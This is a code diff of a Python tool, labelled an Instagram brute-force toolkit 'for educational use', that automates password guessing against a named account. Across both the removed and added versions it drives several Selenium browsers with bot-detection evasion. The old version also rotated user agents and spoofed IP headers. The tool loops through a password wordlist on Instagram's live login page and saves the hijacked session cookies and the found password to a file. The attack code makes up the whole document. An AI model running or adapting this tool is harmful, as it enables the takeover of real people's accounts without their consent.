@@ -1,155 +1,261 @@
-from selenium.webdriver.support import expected_conditions as EC
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.common.exceptions import TimeoutException
-from concurrent.futures import ThreadPoolExecutor
-from selenium.webdriver.common.keys import Keys
-from selenium.webdriver.common.by import By
-from colorama import Fore, init
+##voidBear404## TOOLKIT
+import threading
+import queue
+import time
+import os
+import sys
+import json
+from datetime import datetime
 from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.chrome.options import Options
-import requests 
-import random
-import time 
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from webdriver_manager.chrome import ChromeDriverManager
+from colorama import init, Fore, Style
+
 init(autoreset=True)
 
-PINK = "\033[91m"
-BOLD = "\033[1m"
-RESET = "\033[0m"
-
-logo = f"""
-                            ,--.    
-                           K,   |
-                          /  ~Y`
-                     ,   /   /
-                    |_'-K.__/
-                      `/-.__L._
-                      /  ' /`\_|
-                     /  ' /
-             ____   /  ' /
-      ,-'~~~~    ~~/  ' /_
-    ,'             ``~~~  ',
-   (                        Y
-  |                          |
- |      -                    `,
- |       ',                   )
- |        |   ,..__      __. Y
- |    .,_./  Y ' / ^Y   J   )|
- \           |' /   |   |   ||
-  \          L_/    . _ (_,.'(
-   \,   ,      ^^""' / |      )
-     \_  \          /,L]     /
-       '-_~-,       ` `   ./`
-          `'|_            |
-              ^^\..___,.--`   
+# ==================== BANNER ====================
+BANNER = f"""
+╔══════════════════════════════════════════════════════════╗
+║   {Fore.BLUE}██╗███╗   ██╗███████╗████████╗ █████╗  ██████╗       
+║   {Fore.BLUE}██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝      
+║   {Fore.BLUE}██║██╔██╗ ██║███████╗   ██║   ███████║██║  ███╗     
+║   {Fore.BLUE}██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║   ██║     
+║   {Fore.BLUE}██║██║ ╚████║███████║   ██║   ██║  ██║╚██████╔╝      
+║   {Fore.BLUE}╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝       
+║                                                                             
+║      Instagram_Brute_Force_Tool_by_voidbaer404                   
+║      For Educational Use Only                      
+╚══════════════════════════════════════════════════════════╝
 """
-print(logo)
 
-URL = "https://www.instagram.com/accounts/login"
-USERNAME = input('[~] Enter the Username: ')
-pass_file = input("[~] Enter passwords wordlist path: ")
-ua_file = input("[~] Enter User-Agents wordlist path: ")
-Ip_file = input('[+]enter the ip lists: ')
+class BruteForceInstagram:
+    def __init__(self):
+        self.target_url = "https://www.instagram.com/accounts/login/"
+        self.username = ""
+        self.password_file = ""
+        self.passwords = []
+        self.password_queue = queue.Queue()
+        self.found_flag = threading.Event()
+        self.lock = threading.Lock()
+        self.tested_count = 0
+        self.NUM_BROWSERS = 2
+        self.found_password = None
+        self.active_drivers = []
+        self.error_text = "The login information you entered is incorrect."
+        self.cookies_file = ""  
+        self.PAGE_LOAD_TIMEOUT = 10
+        self.LOGIN_RESULT_TIMEOUT = 5
+        self.username_field_name = "email"
+        self.password_field_name = "pass"
 
-# قراءة ملف كلمات المرور
-with open(pass_file, "r", encoding="utf-8") as f:
-    passwords = [line.strip() for line in f if line.strip()]
+    def get_inputs(self):
+        self.username = input("Enter Instagram username: ").strip()
+        self.password_file = input("Enter password list file path: ").strip()
+        
+        #self.username_field_name = input('Enter the "name" attribute of username field: ').strip()
+        #if not self.username_field_name:
+         #   self.username_field_name = "username"
+        #self.password_field_name = input('Enter the "name" attribute of password field: ').strip()
+        #if not self.password_field_name:
+         #   self.password_field_name = "password"
+         
+        if not os.path.exists(self.password_file):
+            sys.exit(1)
 
-## User-Agents rotation
-with open(ua_file, "r", encoding="utf-8") as f:
-    USER_AGENTS = [line.strip() for line in f if line.strip()]
-## ip rotation
-with open(Ip_file, "r", encoding="utf-8") as f:
-    Ip_file = [line.strip() for line in f if line.strip()]
-###
-if not USER_AGENTS:
-    print("[-] No User-Agents found. Exiting.")
-    exit()
-    
-headers = {
-    'User-Agent': random.choice(USER_AGENTS),
-    'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
-    'accept': "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
-    'accept-language': "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
-    'accept-encoding': "gzip, deflate, br, zstd",
-    'referer': "https://www.instagram.com/",
-    'origin': "https://www.instagram.com",
-    'sec-ch-ua-platform': "Windows",
-    'sec-fetch-site': "cross-site",
-    'cache-control': "no-cache",
-    "X-Forwarded-For": random.choice(Ip_file),
-    'sec-fetch-dest': "image",
-    'sec-ch-ua-mobile': "?0",
-    'sec-fetch-mode': "cors",
-    'priority': "u=1, i",
-    'pragma': "no-cache"
-}
-response = requests.get(URL, headers=headers)
+        browsers = input(f"Number of browsers: ").strip()
+        if browsers:
+            self.NUM_BROWSERS = max(1, int(browsers))
+            
+        #custom_error = input("Enter error message text (or press Enter for default Instagram message): ").strip()
+       #if custom_error:
+            #self.error_text = custom_error
 
-def type_human(element, text, min_delay=0.002, max_delay=0.004):
-    for char in text:
-        element.send_keys(char)
-        time.sleep(random.uniform(min_delay, max_delay))
+        
+        self.cookies_file = f"cookies_{self.username}.json"
 
-def browser_worker(pass_list):
-    # اختيار User-Agent عشوائي لهذا المتصفح من القائمة المدخلة
-    chrome_options = Options()
-    chrome_options.add_argument(f'--user-agent={random.choice(USER_AGENTS)}')
-    chrome_options.add_argument('--lang=en-US')
-    # chrome_options.add_argument('--headless')  # أضفها إذا أردت تسريع أكثر
-    
-    driver = webdriver.Chrome(options=chrome_options)
-    wait = WebDriverWait(driver, 10)  # وقت انتظار أقل
-    
-    try:
-        for password in pass_list:
-            driver.get(URL)
+    def load_passwords(self):
+        with open(self.password_file, 'r', encoding='utf-8', errors='ignore') as f:
+            self.passwords = [line.strip() for line in f if line.strip()]
+        if not self.passwords:
             
-            username_field = wait.until(EC.element_to_be_clickable((By.NAME, "email")))
-            password_field = wait.until(EC.element_to_be_clickable((By.NAME, "pass")))
-            
-            # تفريغ الحقول
-            username_field.click()
-            username_field.send_keys(Keys.CONTROL + "a")
-            username_field.send_keys(Keys.DELETE)
-            password_field.click()
-            password_field.send_keys(Keys.CONTROL + "a")
-            password_field.send_keys(Keys.DELETE)
-            
-            type_human(username_field, USERNAME)
-            type_human(password_field, password)
-            
-            login_button = wait.until(EC.element_to_be_clickable((By.XPATH, "//span[text()='Log in']/ancestor::div[@role='none']")))
-            login_button.click()
-            
+            sys.exit(1)
+        for pwd in self.passwords:
+            self.password_queue.put(pwd)
+        
+        
+    def create_driver(self, browser_id):
+        options = Options()
+        # options.add_argument('--headless') 
+        options.add_argument('--no-sandbox')
+        options.add_argument('--disable-dev-shm-usage')
+        options.add_argument('--disable-gpu')
+        options.add_argument('--disable-blink-features=AutomationControlled')
+        options.add_experimental_option("excludeSwitches", ["enable-automation"])
+        options.add_experimental_option('useAutomationExtension', False)
+        options.add_argument(f'--window-size=450,800')
+        options.add_argument(f'--window-position={ (browser_id-1) * 460 }, 30')
+
+        service = Service(ChromeDriverManager().install())
+        driver = webdriver.Chrome(service=service, options=options)
+        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+        with self.lock:
+            self.active_drivers.append(driver)
+        return driver
+
+    def type_fast(self, element, text):
+        element.clear()
+        element.send_keys(text)
+
+    def check_login_result(self, driver, original_url):
+        try:
+            wait = WebDriverWait(driver, self.LOGIN_RESULT_TIMEOUT)
+            result = wait.until(
+                EC.any_of(
+                    EC.presence_of_element_located((By.XPATH, f"//*[contains(text(), '{self.error_text}')]")),
+                    EC.url_changes(original_url)
+                )
+            )
+            if isinstance(result, bool):
+                return True   
+            else:
+                return False  
+        except Exception:
+            return False
+
+    def save_cookies(self, driver, password):
+        try:
+            cookies = driver.get_cookies()
+            session_data = {
+                "username": self.username,
+                "password": password,
+                "timestamp": datetime.now().isoformat(),
+                "cookies": cookies,
+                "user_agent": driver.execute_script("return navigator.userAgent;")
+            }
+            with open(self.cookies_file, 'w', encoding='utf-8') as f:
+                json.dump(session_data, f, indent=4, ensure_ascii=False)
+
+        except Exception:
+
+            pass
+
+    def try_password(self, driver, password):
+        try:
+            driver.get(self.target_url)
+            original_url = driver.current_url
+
+            wait = WebDriverWait(driver, self.PAGE_LOAD_TIMEOUT)
+
             try:
-                wait.until(EC.any_of(
-                    EC.presence_of_element_located((By.XPATH, "//*[contains(text(),'incorrect')]")),
-                    EC.url_changes(URL)
-                ))
-                
-                if driver.find_elements(By.XPATH, "//*[contains(text(),'incorrect')]"):                    
-                    print(
-                        f"[+] {Fore.BLACK}trying username:{Fore.BLUE}{USERNAME}"
-                        f" | {Fore.BLACK}Pass:{Fore.RED}{password}"
-                        f" | {Fore.BLACK}Session:{Fore.GREEN}{response.status_code} "
-                        f"{Fore.WHITE}[login incorrect]"
-                    )
-                elif driver.current_url != URL:
-                    print(
-                        f"{Fore.BLACK}[+] trying username:{Fore.BLUE}{USERNAME}"
-                        f" | {Fore.BLACK}Pass:{Fore.RED}{password}"
-                        f" | {Fore.BLACK}Session:{Fore.GREEN}{response.status_code}"
-                        f"{Fore.WHITE}login successful"
-                    )
-            except TimeoutException:
-                print("Timeout - no expected state detected")
-    finally:
-        driver.quit()
+                username_field = wait.until(EC.presence_of_element_located((By.NAME, self.username_field_name)))
+            except:
+                return False
+            try:
+                password_field = driver.find_element(By.NAME, self.password_field_name)
+            except:
+                return False
 
-# تقسيم قائمة كلمات المرور على عدد الـ workers (مثلاً 4)
-numbrowaser = 2 # يمكنك تغيير الرقم حسب قدرة جهازك
-chunks = [passwords[i::numbrowaser] for i in range(numbrowaser)]
+            self.type_fast(username_field, self.username)
+            self.type_fast(password_field, password)
 
-with ThreadPoolExecutor(max_workers=numbrowaser) as executor:
-    for chunk in chunks:
-        executor.submit(browser_worker, chunk)
+            try:
+                submit_button = driver.find_element(By.XPATH, "//button[@type='submit']")
+                submit_button.click()
+            except:
+                password_field.send_keys(Keys.ENTER)
+
+            success = self.check_login_result(driver, original_url)
+            return success
+
+        except Exception as e:
+            #print(')
+            return False
+
+    def browser_worker(self, browser_id):
+        driver = None
+        try:
+            driver = self.create_driver(browser_id)
+
+            while not self.found_flag.is_set():
+                try:
+                    password = self.password_queue.get(timeout=1)
+                except queue.Empty:
+                    break
+
+                with self.lock:
+                    self.tested_count += 1
+
+                success = self.try_password(driver, password)
+
+                if success:
+                    with self.lock:
+                        self.found_password = password
+                    # الطباعة الوحيدة عند النجاح
+                    print(Fore.GREEN + f"[+] Trying User: {Fore.YELLOW}{self.username} {Fore.GREEN}| Password: {Fore.YELLOW}{password} {Fore.GREEN} SUCCESS")
+                    self.save_cookies(driver, password)
+                    self.found_flag.set()
+                    break
+                else:
+                    print(Fore.RED + f"[-] Trying User: {Fore.YELLOW}{self.username} {Fore.RED}| Password: {Fore.YELLOW}{password} {Fore.RED} FAILED")
+
+                self.password_queue.task_done()
+        except Exception as e:
+            print(Fore.RED + f"Error in browser {browser_id}: {e}")
+        finally:
+            if driver:
+                try:
+                    driver.quit()
+                    with self.lock:
+                        if driver in self.active_drivers:
+                            self.active_drivers.remove(driver)
+                except:
+                    pass
+
+    def run(self):
+        self.get_inputs()
+        self.load_passwords()
+
+        start_time = time.time()
+
+        threads = []
+        for i in range(1, self.NUM_BROWSERS + 1):
+            t = threading.Thread(target=self.browser_worker, args=(i,))
+            t.daemon = True
+            t.start()
+            threads.append(t)
+
+        try:
+            while not self.found_flag.is_set() and not self.password_queue.empty():
+                time.sleep(0.1)
+        except KeyboardInterrupt:
+            print(Fore.YELLOW + "\n[!] Interrupted by user")
+            self.found_flag.set()
+
+        # إغلاق جميع المتصفحات
+        with self.lock:
+            for driver in self.active_drivers[:]:
+                try:
+                    driver.quit()
+                except:
+                    pass
+            self.active_drivers.clear()
+
+        for t in threads:
+            t.join(timeout=2)
+
+        elapsed = time.time() - start_time
+        if self.found_password:
+
+            print(Fore.GREEN + f"\n Success! Password: {self.found_password} (tested {self.tested_count} passwords in {elapsed:.0f}s)")
+        else:
+            print(Fore.RED + f"\n No password found after {self.tested_count} attempts in {elapsed:.0f}s")
+
+if __name__ == "__main__":
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(BANNER)
+    BruteForceInstagram().run()
